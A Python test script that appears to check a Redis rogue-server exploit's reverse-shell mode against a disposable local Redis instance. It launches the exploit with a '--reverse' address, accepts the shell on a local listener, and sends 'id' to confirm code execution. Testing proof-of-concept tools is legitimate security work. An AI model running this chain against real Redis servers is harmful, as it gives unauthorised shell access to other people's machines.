"""Check the nonblocking reverse-shell mode against disposable local Redis."""

from pathlib import Path
import socket
import subprocess
import sys


SCRIPT = Path(__file__).resolve().parents[1] / "redis-rogue-server.py"


def main():
    listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    listener.bind(("127.0.0.1", 16381))
    listener.listen(1)
    listener.settimeout(20)
    process = None
    try:
        process = subprocess.Popen(
            [sys.executable, str(SCRIPT), "--rhost", "127.0.0.1",
             "--rport", "16379", "--lhost", "127.0.0.1",
             "--lport", "16380", "--dir", "/tmp",
             "--reverse", "127.0.0.1:16381"],
            stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True,
        )
        connection, _ = listener.accept()
        with connection:
            connection.settimeout(10)
            connection.sendall(b"id\nexit\n")
            transcript = bytearray()
            while b"uid=" not in transcript:
                chunk = connection.recv(4096)
                if not chunk:
                    break
                transcript.extend(chunk)
        stdout, stderr = process.communicate(timeout=30)
        if process.returncode != 0 or "[info] MODULE LOAD: OK" not in stdout:
            raise AssertionError(f"PoC failed: {stdout}\n{stderr}")
        if b"uid=" not in transcript:
            raise AssertionError(f"Reverse shell did not execute id: {transcript!r}")
        print("Reverse shell received id output and PoC exited without error")
    finally:
        listener.close()
        if process is not None and process.poll() is None:
            process.kill()
            process.communicate()


if __name__ == "__main__":
    main()
